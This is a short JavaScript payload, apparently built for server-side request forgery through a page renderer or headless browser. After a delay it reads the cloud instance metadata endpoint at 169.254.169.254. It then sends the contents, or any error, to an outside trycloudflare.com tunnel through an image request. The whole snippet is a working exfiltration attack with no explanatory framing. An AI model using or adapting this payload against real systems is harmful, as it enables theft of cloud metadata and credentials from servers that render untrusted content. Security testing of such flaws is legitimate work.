setTimeout(function(){
  var r=document.getElementById('out');
  var x=new XMLHttpRequest();
  x.open('GET','http://169.254.169.254/latest/meta-data/',false);
  try{
    x.send();
    r.textContent='GOT:'+x.responseText;
    var i=new Image();
    i.src='https://influence-barn-expenditures-agriculture.trycloudflare.com/ssrf-result?data='+encodeURIComponent(x.responseText);
  }catch(e){
    r.textContent='FAIL:'+e.message;
    var i=new Image();
    i.src='https://influence-barn-expenditures-agriculture.trycloudflare.com/ssrf-result?err='+encodeURIComponent(e.message);
  }
},2500);
